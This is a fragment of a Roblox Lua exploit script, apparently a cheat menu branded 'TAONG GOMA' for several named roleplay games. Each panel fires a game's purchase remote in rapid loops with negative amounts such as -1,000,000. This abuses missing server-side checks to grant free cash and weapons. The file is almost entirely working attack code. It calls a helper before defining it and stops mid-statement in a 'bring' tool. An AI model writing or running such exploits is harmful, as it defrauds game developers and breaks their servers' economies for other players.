title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
title.Text = "TAONG GOMA CAVITE RP"
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- Dropdown (Select Gun)
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Gun"
dropdown.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
dropdown.TextColor3 = Color3.new(1, 1, 1)
dropdown.Font = Enum.Font.Gotham
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

local gunList = {"Glock-17", "Desert Deagle"}

local selectedGun = nil

-- Dropdown Menu
local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(1, -20, 0, #gunList * 25)
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
dropdownFrame.Visible = false
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 5)

for i, gun in ipairs(gunList) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 25)
    btn.Position = UDim2.new(0, 0, 0, (i - 1) * 25)
    btn.Text = gun
    btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedGun = gun
        dropdown.Text = gun
        dropdownFrame.Visible = false
    end)
end

dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

-- Preset Buttons (Aligned)
local buttonSpacing = 5
local buttonWidth = (300 - 40 - (buttonSpacing * 2)) / 3
local buttonYOffset = 95 + #gunList * 25

local amountBox = Instance.new("TextBox") -- forward declare here so buttons can use it

for i, data in ipairs({
    {Label = "Give 100K", Value = -100000},
    {Label = "Give 1M", Value = -1000000},
    {Label = "Give 10M", Value = -10000000},
}) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, buttonWidth, 0, 30)
    btn.Position = UDim2.new(0, 10 + (buttonWidth + buttonSpacing) * (i - 1), 0, buttonYOffset)
    btn.Text = data.Label
    btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    btn.Parent = frame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        amountBox.Text = tostring(data.Value)
    end)
end

-- Amount Box
amountBox.Size = UDim2.new(1, -20, 0, 30)
amountBox.Position = UDim2.new(0, 10, 0, buttonYOffset + 40)
amountBox.PlaceholderText = "Enter Amount (TAONG GOMA CMD)"
amountBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
amountBox.TextColor3 = Color3.new(1, 1, 1)
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.Font = Enum.Font.Gotham
amountBox.TextSize = 12
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

-- Auto Give Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, buttonYOffset + 80)
toggle.Text = "Start Auto Give"
toggle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
toggle.TextColor3 = Color3.new(1, 1, 1)
toggle.Font = Enum.Font.GothamBold
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

-- Auto Give Logic
local giving = false

toggle.MouseButton1Click:Connect(function()
    giving = not giving
    toggle.Text = giving and "Stop Auto Give" or "Start Auto Give"
    while giving do
        if selectedGun and tonumber(amountBox.Text) then
            ReplicatedStorage.GunShop.Events.Purchase:FireServer(selectedGun, tonumber(amountBox.Text))
        end
        task.wait(0.001)
    end
end)

-- RightShift to toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("BAGONG BARYO SKIN W SOUND [3KTG]", function()
    --// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "GiveAllCashGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 350) -- Adjusted initial height
frame.Position = UDim2.new(0.5, -150, 0.5, -175)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
title.Text = "TAONG GOMA SKIN"
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- Dropdown (Select Gun)
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Gun"
dropdown.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
dropdown.TextColor3 = Color3.new(1, 1, 1)
dropdown.Font = Enum.Font.Gotham
dropdown.TextSize = 10
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

local gunList = {"sophia", "daniel", "cuervo", "anghelgirls", "coach", "berto", "jeric", "killua", "alaspogi", "xynu", "chris", "astig", "sup", "licht", "devil", "UZI"}
local selectedGun = nil

-- Dropdown Menu with ScrollingFrame
local scrollingFrame = Instance.new("ScrollingFrame")
scrollingFrame.Size = UDim2.new(1, -20, 0, 150) -- Fixed height with scroll
scrollingFrame.Position = UDim2.new(0, 10, 0, 85)
scrollingFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
scrollingFrame.Visible = false
scrollingFrame.Parent = frame
scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, #gunList * 20)
scrollingFrame.ScrollBarThickness = 5
Instance.new("UICorner", scrollingFrame).CornerRadius = UDim.new(0, 5)

local uiListLayout = Instance.new("UIListLayout")
uiListLayout.Parent = scrollingFrame
uiListLayout.Padding = UDim.new(0, 2)

for i, gun in ipairs(gunList) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 20) -- Reduced height
    btn.Text = gun
    btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 10
    btn.Parent = scrollingFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedGun = gun
        dropdown.Text = gun
        scrollingFrame.Visible = false
    end)
end

dropdown.MouseButton1Click:Connect(function()
    scrollingFrame.Visible = not scrollingFrame.Visible
end)

-- Preset Buttons (Aligned)
local buttonSpacing = 5
local buttonWidth = (300 - 40 - (buttonSpacing * 2)) / 3
local buttonYOffset = 245 -- Adjusted based on new layout

local amountBox = Instance.new("TextBox") -- forward declare here so buttons can use it

for i, data in ipairs({
    {Label = "Give 100K", Value = -100000},
    {Label = "Give 1M", Value = -1000000},
    {Label = "Give 10M", Value = -10000000},
}) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, buttonWidth, 0, 30)
    btn.Position = UDim2.new(0, 10 + (buttonWidth + buttonSpacing) * (i - 1), 0, buttonYOffset)
    btn.Text = data.Label
    btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    btn.Parent = frame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        amountBox.Text = tostring(data.Value)
    end)
end

-- Amount Box
amountBox.Size = UDim2.new(1, -20, 0, 30)
amountBox.Position = UDim2.new(0, 10, 0, buttonYOffset + 40)
amountBox.PlaceholderText = "Enter Amount (TAONG GOMA CMD)"
amountBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
amountBox.TextColor3 = Color3.new(1, 1, 1)
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.Font = Enum.Font.Gotham
amountBox.TextSize = 12
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

-- Auto Give Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, buttonYOffset + 80)
toggle.Text = "Start Auto Give"
toggle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
toggle.TextColor3 = Color3.new(1, 1, 1)
toggle.Font = Enum.Font.GothamBold
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

-- Auto Give Logic
local giving = false

toggle.MouseButton1Click:Connect(function()
    giving = not giving
    toggle.Text = giving and "Stop Auto Give" or "Start Auto Give"
    while giving do
        if selectedGun and tonumber(amountBox.Text) then
            ReplicatedStorage.BuyItemRemote:FireServer(selectedGun, tonumber(amountBox.Text))
        end
        task.wait(5)
    end
end)

-- RightShift to toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("VENERAL CITY RP [3KTG]", function()
    --// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "GiveAllCashGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 350) -- Adjusted initial height
frame.Position = UDim2.new(0.5, -150, 0.5, -175)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
title.Text = "TAONG GOMA SKIN"
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- Dropdown (Select Gun)
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Gun"
dropdown.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
dropdown.TextColor3 = Color3.new(1, 1, 1)
dropdown.Font = Enum.Font.Gotham
dropdown.TextSize = 10
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

local gunList = {"Silencer Magma", "el", "SAY", "Dragonic Silencer", "Dragonic M4", "4Qs", "Aztecas Familia", "Benten", "Flamethrower", "Grenade", "marysing", "Flashbang", "Handcuffs", "Pipe Bomb", "Smoke Grenade"}
local selectedGun = nil

-- Dropdown Menu with ScrollingFrame
local scrollingFrame = Instance.new("ScrollingFrame")
scrollingFrame.Size = UDim2.new(1, -20, 0, 150) -- Fixed height with scroll
scrollingFrame.Position = UDim2.new(0, 10, 0, 85)
scrollingFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
scrollingFrame.Visible = false
scrollingFrame.Parent = frame
scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, #gunList * 20)
scrollingFrame.ScrollBarThickness = 5
Instance.new("UICorner", scrollingFrame).CornerRadius = UDim.new(0, 5)

local uiListLayout = Instance.new("UIListLayout")
uiListLayout.Parent = scrollingFrame
uiListLayout.Padding = UDim.new(0, 2)

for i, gun in ipairs(gunList) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 20) -- Reduced height
    btn.Text = gun
    btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 10
    btn.Parent = scrollingFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedGun = gun
        dropdown.Text = gun
        scrollingFrame.Visible = false
    end)
end

dropdown.MouseButton1Click:Connect(function()
    scrollingFrame.Visible = not scrollingFrame.Visible
end)

-- Preset Buttons (Aligned)
local buttonSpacing = 5
local buttonWidth = (300 - 40 - (buttonSpacing * 2)) / 3
local buttonYOffset = 245 -- Adjusted based on new layout

local amountBox = Instance.new("TextBox") -- forward declare here so buttons can use it

for i, data in ipairs({
    {Label = "Give 100K", Value = -100000},
    {Label = "Give 1M", Value = -1000000},
    {Label = "Give 10M", Value = -10000000},
}) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, buttonWidth, 0, 30)
    btn.Position = UDim2.new(0, 10 + (buttonWidth + buttonSpacing) * (i - 1), 0, buttonYOffset)
    btn.Text = data.Label
    btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    btn.Parent = frame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        amountBox.Text = tostring(data.Value)
    end)
end

-- Amount Box
amountBox.Size = UDim2.new(1, -20, 0, 30)
amountBox.Position = UDim2.new(0, 10, 0, buttonYOffset + 40)
amountBox.PlaceholderText = "Enter Amount (TAONG GOMA CMD)"
amountBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
amountBox.TextColor3 = Color3.new(1, 1, 1)
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.Font = Enum.Font.Gotham
amountBox.TextSize = 12
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

-- Auto Give Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, buttonYOffset + 80)
toggle.Text = "Start Auto Give"
toggle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
toggle.TextColor3 = Color3.new(1, 1, 1)
toggle.Font = Enum.Font.GothamBold
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

-- Auto Give Logic
local giving = false

toggle.MouseButton1Click:Connect(function()
    giving = not giving
    toggle.Text = giving and "Stop Auto Give" or "Start Auto Give"
    while giving do
        if selectedGun and tonumber(amountBox.Text) then
            ReplicatedStorage.BuyItemRemote:FireServer(selectedGun, tonumber(amountBox.Text))
        end
        task.wait(5)
    end
end)

-- RightShift to toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

addMainMenuButton("URBAN LIST [3KTG]", function()
	--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
gui.Name = "AutoGiveGuns"
gui.ResetOnSpawn = false

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 320)
frame.Position = UDim2.new(0.5, -150, 0.5, -160)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Active = true
frame.Draggable = true
frame.Parent = gui
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
title.Text = "TAONG GOMA URBAN CMD"
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

--// Dropdown Setup
local gunList = {
    "AK-47", "AR15", "Vector", "AmmoBox",
    "Glock-19", "Glock-17", "MP40", "P90",
    "Sten Gun", "Syringe", "Bandage"
}
local selectedGun = nil

local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Gun"
dropdown.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
dropdown.TextColor3 = Color3.new(1, 1, 1)
dropdown.Font = Enum.Font.Gotham
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

local dropdownFrame = Instance.new("ScrollingFrame")
dropdownFrame.Size = UDim2.new(1, -20, 0, 100)
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
dropdownFrame.Visible = false
dropdownFrame.ScrollBarThickness = 6
dropdownFrame.CanvasSize = UDim2.new(0, 0, 0, #gunList * 25)
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 6)

local layout = Instance.new("UIListLayout", dropdownFrame)
layout.Padding = UDim.new(0, 2)

for _, gunName in ipairs(gunList) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 25)
    btn.Text = gunName
    btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 13
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedGun = gunName
        dropdown.Text = gunName
        dropdownFrame.Visible = false
    end)
end

dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

--// Amount Input
local amountBox = Instance.new("TextBox")
amountBox.Size = UDim2.new(1, -20, 0, 30)
amountBox.Position = UDim2.new(0, 10, 0, 190)
amountBox.PlaceholderText = "Enter amount (3KTG CMD)"
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
amountBox.TextColor3 = Color3.new(1, 1, 1)
amountBox.Font = Enum.Font.Gotham
amountBox.TextSize = 14
amountBox.ClearTextOnFocus = false
amountBox.Text = "-100"
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

--// Auto Give Toggle
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, 230)
toggle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
toggle.Text = "Start Auto Give"
toggle.TextColor3 = Color3.new(1, 1, 1)
toggle.Font = Enum.Font.GothamBold
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

--// Give Once Button
local giveOnce = Instance.new("TextButton")
giveOnce.Size = UDim2.new(1, -20, 0, 30)
giveOnce.Position = UDim2.new(0, 10, 0, 275)
giveOnce.Text = "Give Once"
giveOnce.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
giveOnce.TextColor3 = Color3.new(1, 1, 1)
giveOnce.Font = Enum.Font.Gotham
giveOnce.TextSize = 14
giveOnce.Parent = frame
Instance.new("UICorner", giveOnce).CornerRadius = UDim.new(0, 6)

--// Logic
local giving = false

toggle.MouseButton1Click:Connect(function()
    giving = not giving
    toggle.Text = giving and "Stop Auto Give" or "Start Auto Give"
    toggle.BackgroundColor3 = giving and Color3.fromRGB(10, 10, 10) or Color3.fromRGB(0, 0, 0)

    while giving do
        if selectedGun and tonumber(amountBox.Text) then
            ReplicatedStorage:WaitForChild("PurchaseEvent"):FireServer(selectedGun, tonumber(amountBox.Text))
        end
        task.wait(0.001)
    end
end)

giveOnce.MouseButton1Click:Connect(function()
    if selectedGun and tonumber(amountBox.Text) then
        ReplicatedStorage:WaitForChild("PurchaseEvent"):FireServer(selectedGun, tonumber(amountBox.Text))
    end
end)
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("BAGONG BARYO LIST [3KTG]", function()
	--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "GiveAllCashGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 400)
frame.Position = UDim2.new(0.5, -150, 0.5, -200)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
title.Text = "BAGONG BARYO"
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- Dropdown (Select Gun)
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Gun"
dropdown.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
dropdown.TextColor3 = Color3.new(1, 1, 1)
dropdown.Font = Enum.Font.Gotham
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

local gunList = {"Silenced Pistol", "Crowbar", "Drill", "Oxy", "MCX", "AK-47", "MEDKIT", "Milk", "Tubigs"}

local selectedGun = nil

-- Dropdown Menu
local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(1, -20, 0, #gunList * 25)
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
dropdownFrame.Visible = false
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 5)

for i, gun in ipairs(gunList) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 25)
    btn.Position = UDim2.new(0, 0, 0, (i - 1) * 25)
    btn.Text = gun
    btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedGun = gun
        dropdown.Text = gun
        dropdownFrame.Visible = false
    end)
end

dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

-- Preset Buttons (Aligned)
local buttonSpacing = 5
local buttonWidth = (300 - 40 - (buttonSpacing * 2)) / 3
local buttonYOffset = 95 + #gunList * 25

local amountBox = Instance.new("TextBox") -- forward declare here so buttons can use it

for i, data in ipairs({
    {Label = "Give 100K", Value = -100000},
    {Label = "Give 1M", Value = -1000000},
    {Label = "Give 10M", Value = -10000000},
}) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, buttonWidth, 0, 30)
    btn.Position = UDim2.new(0, 10 + (buttonWidth + buttonSpacing) * (i - 1), 0, buttonYOffset)
    btn.Text = data.Label
    btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    btn.Parent = frame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        amountBox.Text = tostring(data.Value)
    end)
end

-- Amount Box
amountBox.Size = UDim2.new(1, -20, 0, 30)
amountBox.Position = UDim2.new(0, 10, 0, buttonYOffset + 40)
amountBox.PlaceholderText = "Enter Amount (TAONG GOMA CMD)"
amountBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
amountBox.TextColor3 = Color3.new(1, 1, 1)
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.Font = Enum.Font.Gotham
amountBox.TextSize = 12
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

-- Auto Give Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, buttonYOffset + 80)
toggle.Text = "Start Auto Give"
toggle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
toggle.TextColor3 = Color3.new(1, 1, 1)
toggle.Font = Enum.Font.GothamBold
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

-- Auto Give Logic
local giving = false

toggle.MouseButton1Click:Connect(function()
    giving = not giving
    toggle.Text = giving and "Stop Auto Give" or "Start Auto Give"
    while giving do
        if selectedGun and tonumber(amountBox.Text) then
            ReplicatedStorage.BuyItemRemote:FireServer(selectedGun, tonumber(amountBox.Text))
        end
        task.wait(0.001)
    end
end)

-- RightShift to toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

--// Function to Add Buttons to Main Menu
local function addMainMenuButton(text, callback)
	local panel = tabPanels["BRING MENU"]
	if not panel then return end

	local button = Instance.new("TextButton")
	button.Size = UDim2.new(1, -20, 0, 36)
	button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	button.TextColor3 = Color3.new(1, 1, 1)
	button.Font = Enum.Font.GothamSemibold
	button.TextSize = 14
	button.Text = text
	button.AutoButtonColor = false
	button.Parent = panel
	Instance.new("UICorner", button).CornerRadius = UDim.new(0, 6)

	button.MouseEnter:Connect(function()
		TweenService:Create(button, TweenInfo.new(0.2), {
			BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		}):Play()
	end)
	button.MouseLeave:Connect(function()
		TweenService:Create(button, TweenInfo.new(0.2), {
			BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		}):Play()
	end)

	button.MouseButton1Click:Connect(function()
		clickSound:Play()
		callback()
	end)
end

--// 4 Buttons in Roleplay Script
addMainMenuButton("BRING SYSTEM [3KTG]", function()
	local player = game.Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")

-- Setup UI
local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
screenGui.Name = "BringPartGUI"
screenGui.ResetOnSpawn = false

local frame = Instance.new("Frame")
frame.Name = "Frame"
frame.Size = UDim2.new(0, 300, 0, 150)
frame.Position = UDim2.new(0.5, -150, 0.5, -75)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui

local titleLabel = Instance.new("TextLabel")
titleLabel.Text = "TAONG GOMA CMD"
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255) -- White na
titleLabel.TextSize = 16
titleLabel.BackgroundTransparency = 1
titleLabel.Size = UDim2.new(1, 0, 0, 20)
titleLabel.Position = UDim2.new(0, 0, 0, 5)
titleLabel.Parent = frame

local textBox = Instance.new("TextBox")
textBox.Name = "CommandBox"
textBox.Text = ""
textBox.PlaceholderText = "Enter Command (3KTG)"
textBox.Font = Enum.Font.GothamBold
textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
textBox.TextSize = 24
textBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
textBox.BorderSizePixel = 0
textBox.Size = UDim2.new(0.9, 0, 0, 40)
textBox.Position = UDim2.new(0.05, 0, 0, 40)
textBox.ClearTextOnFocus = false
textBox.Parent = frame

local toggleButton = Instance.new("TextButton")
toggleButton.Text = "OFF"
toggleButton.Font = Enum.Font.GothamBold
